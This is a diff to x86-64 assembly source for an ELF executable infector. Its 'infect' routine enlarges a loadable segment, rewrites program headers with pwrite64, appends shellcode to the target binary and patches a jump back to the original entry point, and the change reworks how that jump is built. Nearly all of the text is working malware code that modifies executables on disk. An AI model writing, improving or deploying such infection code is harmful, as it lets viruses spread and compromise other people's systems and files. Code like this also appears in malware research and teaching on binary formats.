@@ -91,7 +91,6 @@ section .bss
     loop_counter resq 1
     stat_buffer resb 144
     file_size resq 1
-    jmp_inst resb 5
 
 section .text
     global _start
@@ -270,11 +269,11 @@ infect:
 
     ; Add shellcode_len to filesz and memsz
     mov rax, [rsi + 32] ; Get the p_filesz field
-    add rax, shellcode_len + 5      ; + 5 for the jmp at the end
+    add rax, shellcode_len
     mov [rsi + 32], rax
 
     mov rax, [rsi + 40] ; Get the p_memsz field
-    add rax, shellcode_len + 5
+    add rax, shellcode_len
     mov [rsi + 40], rax
 
     ; Set p_align to 0x1000 (most PT_LOAD segment have P_ALIGN at 0x1000)
@@ -285,40 +284,30 @@ infect:
     mov rsi, buffer
     mov [rsi + 24], rbx     ; rbx has previously computed P_VADDR
 
-    mov rbx, [fd]   ; If we use [fd] directly the second one won't work
+    mov r15, [fd]   ; If we use [fd] directly the second one won't work
 
     ; Write the buffer changes to the file
     mov rax, 18      ; pwrite64
-    mov rdi, rbx 
+    mov rdi, r15 
     mov rsi, buffer
     mov rdx, buffer_len
     xor r10, r10    ; No offset
     syscall
 
+    ; Update shellcode to jump to the original entry point
+    mov rax, rbx                ; + start of shellcode (rbx has P_VADDR)
+    add rax, shellcode_len      ; + shellcode = jmp address
+    mov rcx, [old_e_entry]      ; we use original e_entry as a baseline
+    sub rcx, rax                ; and substract the added stuff from it
+    mov rsi, shellcode      
+    mov [rsi + shellcode_len - 4], ecx         ; 4 for the placeholders
+
     ; Write the shellcode at the end of the file
     mov rax, 18      ; pwrite64
-    mov rdi, rbx
+    mov rdi, r15
     mov rsi, shellcode
     mov rdx, shellcode_len
     mov r10, [file_size]
-    syscall
-
-    ; Write jmp instruction
-    mov rax, rbx    ; P_VADDR
-    add rax, 5
-    mov rcx, [old_e_entry]
-    sub rcx, rax
-    sub rcx, shellcode_len
-    mov byte [jmp_inst], 0xE9   ; jmp (relative)
-    mov [jmp_inst + 1], ecx     ; Only use the last 4 bytes
-
-    ; Write jmp at the end of the file
-    mov rax, 18      ; pwrite64
-    mov rdi, rbx
-    mov rsi, jmp_inst
-    mov rdx, 5
-    mov r10, [file_size]
-    add r10, shellcode_len
     syscall
 
     jmp close
